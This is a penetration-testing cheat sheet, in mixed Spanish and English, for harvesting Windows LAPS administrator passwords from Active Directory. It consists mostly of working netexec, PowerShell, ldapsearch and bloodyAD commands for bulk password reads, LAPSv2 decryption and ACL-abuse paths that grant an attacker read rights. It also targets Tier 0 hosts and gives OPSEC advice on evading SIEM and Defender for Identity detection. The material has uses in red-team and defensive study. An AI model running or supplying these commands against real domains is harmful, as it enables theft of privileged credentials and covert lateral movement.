---
aliases:
  - LAPS Bulk Read
  - Get-AdmPwdPassword
  - Get-LapsADPassword
  - LAPS Decryption
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AD - LAPS Enumeration]]'
---
# AD - LAPS Enumeration - LAPS Read & Decryption

***

## Bulk Read with netexec

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb hosts.txt -u u -p p --laps` | Bulk read v1/v2 (auto-detect) | Standard. |
| `nxc ldap <DC> -u u -p p --laps` | Read via LDAP path | SMB blocked. |
| `nxc smb hosts.txt -u u -p p --laps --laps-encrypted` | Forzar decrypt LAPSv2 | Modern. |
| `nxc smb 10.0.0.0/24 -u u -p p --laps` | Sweep subnet | Discovery + read. |
^ad-lapsread-netexec

```bash
# Pipeline completo
nxc ldap <DC> -u user -p pass --computers > hosts.txt
nxc smb hosts.txt -u user -p pass --laps > laps_creds.txt

# Output:
# host01    LAPS    Administrator:abcDef123!
# host05    LAPS    Administrator:xyz9876@@
```

___

## Single Host Read (PowerShell)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-AdmPwdPassword -ComputerName <host>` (LAPSv1 module) | Single host LAPSv1 pwd | Native v1. |
| `Get-LapsADPassword <host> -AsPlainText` (Win LAPS module) | LAPSv2 cleartext | Native v2. |
| `Get-LapsADPassword <host> -AsPlainText -IncludeHistory` | + history | Forensics. |
| `Get-ADComputer <host> -Pr ms-Mcs-AdmPwd \| Select -Expand 'ms-Mcs-AdmPwd'` | Raw LDAP read v1 | Sin module. |
| `(Get-ADComputer <host> -Pr msLAPS-Password).'msLAPS-Password' \| ConvertFrom-Json` | Parse JSON v2 (cleartext mode) | Sin module. |
^ad-lapsread-pwsh

```powershell
# Pipeline single host
$host = "DC01"
try {
  Get-LapsADPassword $host -AsPlainText
} catch {
  # Fallback v1
  Get-AdmPwdPassword -ComputerName $host
}
```

___

## LDAP Direct Read

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" samAccountName ms-Mcs-AdmPwd` | Bulk LAPSv1 readable | Linux. |
| `ldapsearch ... "(msLAPS-Password=*)" samAccountName msLAPS-Password` | Bulk LAPSv2 cleartext | Si encryption disabled. |
| `ldapsearch ... "(msLAPS-EncryptedPassword=*)" samAccountName msLAPS-EncryptedPassword` | Encrypted blobs | Modern. |
| `nxc ldap <DC> -u u -p p --query "(\|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))" "samAccountName,ms-Mcs-AdmPwd,msLAPS-Password"` | Wrapper netexec | Quick. |
^ad-lapsread-ldap

```bash
# LDAP raw — cleartext bulk
ldapsearch -h <DC> -D 'corp\u' -w pass \
  -b "DC=corp,DC=local" \
  "(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))" \
  samAccountName ms-Mcs-AdmPwd msLAPS-Password
```

___

## LAPSv2 Decryption

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-LapsADPassword <host> -AsPlainText` | Auto-decrypt si tenés DPAPI-NG access | Native modern. |
| Member del `EncryptionPrincipal` group del GPO LAPS | Required para decrypt | Permission. |
| `[Microsoft.LAPS.Cmdlet.Internal.Crypto]::ProtectAndUnprotect(...)` | Decryption raw API | Edge. |
^ad-lapsread-decrypt

**DPAPI-NG decryption flow:**
1. Computer encrypts pwd con public key del `EncryptionPrincipal` (group/user del GPO).
2. Solo members del principal pueden decrypt (DPAPI-NG resolves via Kerberos).
3. LDAP read del blob != decrypt — se necesita Kerberos auth + group membership.

```powershell
# Identify EncryptionPrincipal del GPO
Get-GPRegistryValue -Name "<LAPS GPO>" \
  -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\LAPS\Config" \
  -ValueName "ADPasswordEncryptionPrincipal" |
  Select Value

# Member check
Get-ADGroupMember "<EncryptionPrincipal-group>" -Recursive
```

___

## ACL Bypass Paths

| **Path** | **Comando / Setup** | **Cuándo** |
|:---:|:---:|:---:|
| Compromise group con LAPS read perms | Member compromise → LAPS read effective | ACL chain. |
| `WriteOwner` sobre LAPS reader group | Take ownership → add self | Privesc combo. |
| `WriteDacl` sobre OU contenente computer | Modify DACL → grant self read | Privesc combo. |
| Shadow Credentials sobre group member | Auth as group member | Modern abuse. |
| `ForceChangePassword` sobre group member | Reset + login | Direct. |
| Computer self-write abuse | Compromise computer → has its own LAPS read implicitly | Edge. |
^ad-lapsread-bypass

```bash
# Pipeline: BloodHound → identify path → exploit
# Cypher:
# MATCH (u {owned:true})-[*1..3]->(g:Group)-[:ReadLAPSPassword]->(c:Computer)
# RETURN u.name,g.name,c.name

# Una vez identificada path, exploit con bloodyAD:
bloodyAD --host <DC> -d corp -u u -p pass add genericAll <victim-group> <atacante>

# Then read LAPS as efective member
nxc smb <target-host> -u atacante -p pass --laps
```

___

## Cross-Correlation with Privileged Targets

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter * -Pr ms-Mcs-AdmPwd,DistinguishedName \| ? {$_.'ms-Mcs-AdmPwd' -and $_.DistinguishedName -match "Tier 0\|Domain Controllers"}` | LAPS readable + Tier 0 host | Critical priv. |
| BloodHound `MATCH (u {owned:true})-[:ReadLAPSPassword]->(c:Computer {highvalue:true}) RETURN u,c` | Path a high-value | Attack planning. |
| `Get-ADComputer -SearchBase "OU=Domain Controllers,..." -Filter * -Pr msLAPS-EncryptedDSRMPassword` | DSRM passwords (DCs) | Edge — DC recovery. |
^ad-lapsread-correlate

```powershell
# Tier 0 + LAPS readable = critical
Get-ADComputer -Filter * -Pr ms-Mcs-AdmPwd,msLAPS-Password,DistinguishedName |
  Where {
    ($_.'ms-Mcs-AdmPwd' -or $_.'msLAPS-Password') -and
    $_.DistinguishedName -match "Domain Controllers|Tier 0|Privileged"
  }
```

___

## OPSEC for LAPS Read

| **Práctica** | **Implementación** | **Cuándo** |
|:---:|:---:|:---:|
| Single host read vs bulk | Targeted (1 query) | Stealth. |
| Avoid `--laps` mass scan | Triggers MDI / SIEM | Bulk = loud. |
| LDAP query con SACL audit | Cada read logueado | Defender side. |
| Use Kerberos auth (`-k`) | Avoid NTLM | OPSEC. |
| Read off-hours | Match legit activity | Match baseline. |
| Cleanup post-engagement | Document reads + force rotate | Hygiene. |
^ad-lapsread-opsec

___

## Common Read Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `LDAP_INSUFFICIENT_RIGHTS` | Sin ACE para read attr | Bypass via ACL chain. |
| `LDAP_NO_SUCH_ATTRIBUTE` | LAPS no deployed en host | Check schema + GPO. |
| Empty `ms-Mcs-AdmPwd` value | Pwd not set yet (post-deploy initial) | Wait next rotation o force `Reset-AdmPwdPassword`. |
| LAPSv2 blob unreadable | Sin decrypt rights | Member del `EncryptionPrincipal`. |
| `STATUS_ACCESS_DENIED` (SMB) | nxc auth issue | Check creds / try LDAP path. |
^ad-lapsread-errors

***
